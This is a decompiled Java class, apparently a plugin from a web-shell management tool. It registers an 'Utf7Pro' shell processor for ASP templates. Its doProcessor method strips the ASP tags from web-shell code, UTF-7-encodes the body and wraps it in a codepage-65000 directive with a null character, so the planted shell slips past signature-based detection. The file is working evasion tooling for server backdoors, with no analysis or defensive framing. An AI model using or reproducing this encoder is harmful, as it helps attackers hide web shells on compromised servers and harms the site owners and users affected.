//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package core.shellprocessor.aspUtf7;

import core.annotation.GenerateProcessor;
import core.imp.ShellProcessor;

@GenerateProcessor(
        DisplayName = "Utf7Pro",
        superTemplate = {"asp"}
)
public class AspUtf7 implements ShellProcessor {
    public AspUtf7() {
    }

    public static String utf7_encode(String text) throws Exception {
        byte[] s = text.getBytes("utf-16be");
        String result = "";

        Class baseCls;
        try {
            baseCls = Class.forName("java.util.Base64");
            Object Encoder = baseCls.getMethod("getEncoder", (Class[])null).invoke(baseCls, (Object[])null);
            Class enen = Encoder.getClass();
            result = (String)enen.getMethod("encode", byte[].class).invoke(Encoder, s);
            result = result.replace("\n", "").replace("\r", "").replace("=", "").replace("/", ",");
        } catch (Throwable var7) {
            baseCls = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = baseCls.newInstance();
            Class enen = Encoder.getClass();
            result = (String)enen.getMethod("encode", byte[].class).invoke(Encoder, s);
            result = result.replace("\n", "").replace("\r", "").replace("=", "").replace("/", ",");
        }

        return result;
    }

    public static String utf7_decode(String text) throws Exception {
        text = text.replace(",", "/") + "==";
        byte[] data = text.getBytes();

        byte[] decodebs;
        Class baseCls;
        try {
            baseCls = Class.forName("java.util.Base64");
            Object Decoder = baseCls.getMethod("getDecoder", (Class[])null).invoke(baseCls, (Object[])null);
            Class dede = Decoder.getClass();
            decodebs = (byte[])((byte[])dede.getMethod("decode", byte[].class).invoke(Decoder, data));
        } catch (Throwable var7) {
            baseCls = Class.forName("sun.misc.BASE64Decoder");
            Object Decoder = baseCls.newInstance();
            Class dede = Decoder.getClass();
            decodebs = (byte[])((byte[])dede.getMethod("decodeBuffer", String.class).invoke(Decoder, new String(data)));
        }

        text = new String(decodebs, "utf-16be");
        return text;
    }

    public byte[] doProcessor(byte[] shell, String suffix) {
        try {
            String shellContent = new String(shell);
            shellContent = shellContent.replace("<%", "").replace("%>", "");
            shellContent = "\nResponse.codepage=65001:\n" + shellContent;
            shellContent = utf7_encode(shellContent);
            int[] var10000 = new int[]{0, 7, 8};
            char[] chars = Character.toChars(0);
            shellContent = "<%" + chars[0] + "@codepage='65000'0000%><%+" + shellContent + "-%>";
            return shellContent.getBytes();
        } catch (Exception var6) {
            var6.printStackTrace();
            return null;
        }
    }
}
